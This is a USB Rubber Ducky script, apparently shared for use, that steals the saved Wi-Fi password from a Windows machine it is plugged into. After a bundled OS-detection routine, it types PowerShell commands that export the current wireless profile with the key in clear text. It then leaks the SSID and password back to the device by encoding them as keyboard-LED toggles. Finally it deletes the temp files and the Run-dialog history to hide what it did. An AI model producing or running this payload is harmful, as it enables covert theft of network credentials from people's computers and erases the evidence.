REM WifiProfile Stealer Sidechannel Exfil 
REM HackingMark
REM Checks OS, if it's Windows, the connected Wifi Creds will be exfiltrated via Sidechannel Exfiltration Technique
REM Testet on Windows10 and 11

EXTENSION OS_DETECTION
    REM VERSION 1.0

    REM USB Rubber Ducky Host OS Detection
    REM Generic OS detection at a high view is a moving target
    REM results may vary greatly depending 
    REM on a combination of many variables:
    REM  - number of testing stages
    REM  - specific devices and versions tested against
    REM  - number of systems testing for (scope)
    REM  - detection techniques (passive/invisible/active/hybrid)
    REM  - overall speed
    REM  - overall accuracy

    REM TARGET:
    REM DEFAULT - Windows, Mac, Linux
    REM ADVANCED_DETECTION - Windows, Mac, Linux, iOS, ChromeOS, Android

    REM USAGE:
    REM Uncomment the function call below to run this extension inline (here)
    REM or call DETECT_OS() anywhere in your payload after the extension
    REM Place this extension and the DETECT_OS() before
    REM you would like to first reference $_OS to execute payload code conditionally

    REM DEPLOYMENT:
    REM Plug Ducky into host

    REM begin extension options
    DEFINE VERBOSE FALSE
    DEFINE ADVANCED_DETECTION FALSE
    DEFINE STARTUP_DELAY 1500
    DEFINE RESTART_WAIT 1000
    DEFINE OS_DETECT_MODE HID
    DEFINE OS_DETECT_VID VID_05AC
    DEFINE OS_DETECT_PID PID_021E
    DEFINE WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE HOST_RESPONSE_TIMEOUT 1000
    REM end extension options

    FUNCTION DETECT_OS()
        $_HOST_CONFIGURATION_REQUEST_COUNT = 0
        ATTACKMODE OS_DETECT_MODE OS_DETECT_VID OS_DETECT_PID
        DELAY STARTUP_DELAY
        SAVE_HOST_KEYBOARD_LOCK_STATE
    
        IF VERBOSE THEN
            IF ADVANCED_DETECTION THEN
                STRING ADVANCED OS DETECT
            ELSE 
                STRING OS DETECT
            END_IF
    
            ENTER
            STRING test caps
        END_IF
    
        IF ($_CAPSLOCK_ON == FALSE) THEN
            LED_R
            CAPSLOCK
            DELAY HOST_RESPONSE_TIMEOUT 
        END_IF
        LED_OFF
    
        IF VERBOSE THEN
            ENTER
            STRING test done
        END_IF
    
        IF $_RECEIVED_HOST_LOCK_LED_REPLY THEN
            IF VERBOSE THEN
                ENTER
                STRING received led response
            END_IF
            LED_G
            IF ($_HOST_CONFIGURATION_REQUEST_COUNT > WINDOWS_HOST_REQUEST_COUNT) THEN
                IF VERBOSE THEN
                    ENTER
                    STRING prediction: Windows
                END_IF
                $_OS = WINDOWS
            ELSE
                IF VERBOSE THEN
                    ENTER
                    STRING prediction: Linux
                END_IF
                $_OS = LINUX
            END_IF
        ELSE
            IF VERBOSE THEN
                ENTER
                STRING no led response
                ENTER
                STRING prediction: MacOS
            END_IF
            $_OS = MACOS
        END_IF
    
        IF ADVANCED_DETECTION THEN
            IF ( $_OS == LINUX ) THEN
                IF VERBOSE THEN
                    ENTER
                    STRING soft reconnect
                END_IF
                ATTACKMODE OFF
                DELAY RESTART_WAIT
                ATTACKMODE OS_DETECT_MODE OS_DETECT_VID OS_DETECT_PID
                DELAY CONNECT_WAIT
                IF VERBOSE THEN
                    ENTER
                    STRING reconnected
                END_IF
                IF ($_CAPSLOCK_ON == TRUE) THEN
                    IF VERBOSE THEN
                        ENTER
                        STRING caps led on
                        ENTER
                        STRING test numlock
                    END_IF
                    NUMLOCK
                    DELAY HOST_RESPONSE_TIMEOUT
                    IF VERBOSE THEN
                        ENTER
                        STRING test done
                    END_IF
                    IF ($_NUMLOCK_ON == FALSE) THEN
                        IF VERBOSE THEN
                            ENTER
                            STRING no numlock led
                            ENTER
                            STRING prediction: ChromeOS
                        END_IF
                        $_OS = CHROMEOS
                    ELSE
                        IF VERBOSE THEN
                            ENTER
                            STRING numlock led on
                            ENTER
                            STRING testing scrolllock
                        END_IF
                        SCROLLLOCK
                        DELAY HOST_RESPONSE_TIMEOUT
                        IF VERBOSE THEN
                            ENTER
                            STRING test done
                        END_IF
                        IF ($_SCROLLLOCK_ON == TRUE) THEN
                            IF VERBOSE THEN
                                ENTER
                                STRING scrolllock led on
                                ENTER
                                STRING prediction: Android
                            END_IF
                            $_OS = ANDROID
                        ELSE
                            IF VERBOSE THEN
                                ENTER
                                STRING no scrolllock reply 
                                ENTER
                                STRING prediction: Linux
                            END_IF
                            $_OS = LINUX
                        END_IF
                    END_IF
                END_IF
            ELSE IF ($_OS == MACOS) THEN
                IF ($_CAPSLOCK_ON == TRUE) THEN
                    IF VERBOSE THEN
                        ENTER
                        STRING caps led on
                        ENTER
                        STRING prediction: iOS
                    END_IF
                    $_OS = IOS
                ELSE 
                    IF VERBOSE THEN
                        ENTER
                        STRING no caps reply
                        ENTER
                        STRING prediction: MacOS
                    END_IF
                    $_OS = MACOS
                END_IF
            ELSE IF ($_OS == WINDOWS) THEN
                IF VERBOSE THEN
                    ENTER
                    STRING Confident Windows Prediction
                END_IF
                $_OS = WINDOWS
            END_IF
        END_IF
    
        RESTORE_HOST_KEYBOARD_LOCK_STATE
        
        IF VERBOSE THEN
            ENTER
            STRING OS_DETECT complete
            ENTER
        END_IF
    END_FUNCTION
    
    REM Uncomment the function call below to run this extension inline (here)
    REM or call DETECT_OS() anywhere in your payload after the extension

    REM DETECT_OS()
END_EXTENSION


DETECT_OS()

IF ($_OS == WINDOWS)
    ATTACKMODE HID
    LED_OFF
    DELAY 2000

    SAVE_HOST_KEYBOARD_LOCK_STATE
    $_EXFIL_MODE_ENABLED = TRUE
    $_EXFIL_LEDS_ENABLED = TRUE

    REM Store the currently connected wireless LAN SSID & Key to %tmp%\z
    GUI r
    DELAY 100
    STRINGLN powershell 
    DELAY 200
    STRINGLN cd $env:tmp; $B=Get-NetConnectionProfile; $A='.\WLAN*-'+$B.Name+'.xml'; netsh wlan export profile  key=clear;[XML]$WLAN = Get-Content -Path $A; $Name = $WLAN.WLANProfile.SSIDConfig.SSID.Name; $Pass = $WLAN.WLANProfile.MSM.security.sharedKey.keyMaterial; $Name + ":" + $Pass > $env:tmp\z;exit
    GUI r
    DELAY 3000
    STRINGLN powershell "cd $env:tmp;rm '.\WLAN*.xml'"
    DELAY 200

    REM Convert the stored credentials into CAPSLOCK and NUMLOCK values.
    GUI r
    DELAY 100
    STRING powershell "foreach($b in $(cat $env:tmp\z -En by)){foreach($a in 0x80,
    STRING 0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'}else
    STRING {$o+='%{CAPSLOCK}'}}};$o+='%{SCROLLLOCK}';echo $o >$env:tmp\z"
    ENTER
    DELAY 1000

    REM Use powershell to inject the CAPSLOCK and NUMLOCK values to the Ducky.
    GUI r
    DELAY 100
    STRING powershell "$o=(cat $env:tmp\z);Add-Type -A System.Windows.Forms;
    STRING [System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\z"
    ENTER


REM The final SCROLLLOCK value will be sent to indicate that EXFIL is complete.

    WAIT_FOR_SCROLL_CHANGE
    LED_G
    $_EXFIL_MODE_ENABLED = FALSE
    RESTORE_HOST_KEYBOARD_LOCK_STATE
REM Clear Run History
GUI r
DELAY 100
STRINGLN powershell "cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\; Remove-Item '.\RunMRU\'"
 
ELSE
REM If it's no Windows Maschine, go into Arming mode
    ATTACKMODE HID STORAGE
END_IF
